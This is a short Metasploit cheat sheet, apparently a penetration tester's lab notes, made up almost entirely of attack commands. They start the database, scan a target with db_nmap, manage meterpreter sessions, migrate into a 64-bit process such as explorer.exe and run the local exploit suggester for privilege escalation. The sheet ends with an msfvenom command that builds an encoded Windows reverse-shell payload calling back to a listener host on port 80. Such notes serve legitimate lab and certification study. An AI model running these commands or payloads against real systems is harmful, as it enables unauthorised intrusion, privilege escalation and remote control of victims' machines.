#### Metasploit

```
# Start Metasploit
msfdb run

# Interact with workspaces
workspace

# For help
workspace -h

# Scan target with nmap
db_nmap -A <target ip>

```
#### Access a backgrounded meterpreter session
```
sessions -i <number>
```

#### Check Architecture and Meterpreter Version
```
sysinfo
```

#### Migrate from 32-bit to 64-bit Meterpreter session
```
# From your meterpreter session
ps

# Migrate into an X64 process such as explorer.exe
migrate <PID #>
```

#### Privesc with a Meterpreter session
```
# Background your low-priv meterpreter session
background

# local_exploit_suggester
use multi/recon/local_exploit_suggester

# show options
set session #
exploit
```

#### Creating payloads with msfvenom
```
# Windows shell with bad characters and alpha mixed coding in C format
msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.49.163 LPORT=80 -e x86/alpha_mixed -f c
```
